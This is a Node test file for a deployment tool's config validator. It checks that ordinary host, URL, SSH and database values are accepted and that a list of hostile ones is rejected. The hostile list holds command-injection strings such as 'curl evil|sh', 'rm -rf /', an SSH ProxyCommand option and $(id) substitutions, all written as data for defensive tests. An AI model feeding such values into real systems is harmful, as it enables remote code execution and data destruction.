import { test } from "node:test"
import assert from "node:assert/strict"
import { configProblem } from "../.dagger/src/config-validate.ts"

const env = {
  url: "http://host.docker.internal:8080",
  host: "host.docker.internal",
  sshPort: 2222,
  sshUser: "deploy",
  dbContainer: "shipkit-fixture-db",
  network: "kamal",
  database: "app",
  dbUser: "postgres",
}

const config = (over: Record<string, unknown> = {}, envOver: Record<string, unknown> = {}) =>
  ({
    stack: "dotnet",
    db: "postgres",
    delivery: "kamal",
    health: "/health",
    project: "src/Api",
    dockerfile: "Dockerfile",
    registry: "ghcr.io/x/y",
    service: "shipkit-fixture",
    defaultBranch: "main",
    publish: false,
    stackVersion: "10.0",
    targetArch: "linux-arm64",
    environments: { prod: { ...env, ...envOver } },
    ...over,
  }) as never

test("the fixture's own values are accepted", () => {
  assert.equal(configProblem(config()), null)
})

test("ordinary real-world values are accepted", () => {
  assert.equal(configProblem(config({ health: "/health/ready?full=1" }, { url: "https://api.client.com/", host: "10.0.0.5", sshPort: 22 })), null)
  assert.equal(configProblem(config({}, { host: "2001:db8::1" })), null)
  assert.equal(configProblem(config({ service: "" }, { host: undefined, sshUser: "", dbContainer: undefined })), null)
})

test("a Next project passes the same shape checks with none of the .NET-shaped values", () => {
  // Shapes only: whether a stack may leave `project` out, and what its stackVersion means,
  // is adapters/requirements.ts (tests/stack-requirements.test.ts).
  const next = config({
    stack: "next",
    db: "none",
    lint: "eslint",
    project: ".",
    stackVersion: "22",
    targetArch: "linux-x64",
    environments: {},
  })
  assert.equal(configProblem(next), null)
})

const hostile: [string, Record<string, unknown>, Record<string, unknown>][] = [
  ["host", {}, { host: "example.com;curl evil|sh" }],
  ["host", {}, { host: "-oProxyCommand=touch pwned" }],
  ["host", {}, { host: "h$(id)" }],
  ["sshUser", {}, { sshUser: "deploy`id`" }],
  ["sshUser", {}, { sshUser: "-l root" }],
  ["dbContainer", {}, { dbContainer: "db; rm -rf /" }],
  ["dbUser", {}, { dbUser: "postgres' --" }],
  ["database", {}, { database: "app$(id)" }],
  ["network", {}, { network: "kamal && id" }],
  ["url", {}, { url: 'http://x/"$(id)"' }],
  ["url", {}, { url: "http://x/`id`" }],
  ["url", {}, { url: "http://x/ a" }],
  ["url", {}, { url: "ftp://x/" }],
  ["url", {}, { url: "not a url" }],
  ["service", { service: "app;id" }, {}],
  ["health", { health: "/health$(id)" }, {}],
  ["health", { health: "health" }, {}],
  ["stackVersion", { stackVersion: "10.0;id" }, {}],
  ["stackVersion", { stack: "next", stackVersion: "22 && id" }, {}],
  ["targetArch", { targetArch: "linux-x64 && id" }, {}],
]

for (const [field, over, envOver] of hostile) {
  test(`${field} ${JSON.stringify({ ...over, ...envOver })} is a config error naming the field`, () => {
    const problem = configProblem(config(over, envOver))
    assert.ok(problem, "accepted a value that is a command")
    assert.match(problem.message, new RegExp(`\\b${field}\\b`))
    assert.ok(problem.next.length > 0)
  })
}

test("sshPort must be a whole number in range", () => {
  for (const sshPort of [Number.NaN, 0, 65536, 22.5, -1]) {
    const problem = configProblem(config({}, { sshPort }))
    assert.match(problem?.message ?? "", /sshPort must be a whole number from 1 to 65535/, String(sshPort))
  }
  assert.equal(configProblem(config({}, { sshPort: 65535 })), null)
})

test("a host means an sshUser that is a login name", () => {
  assert.match(configProblem(config({}, { sshUser: "" }))?.message ?? "", /sshUser/)
})
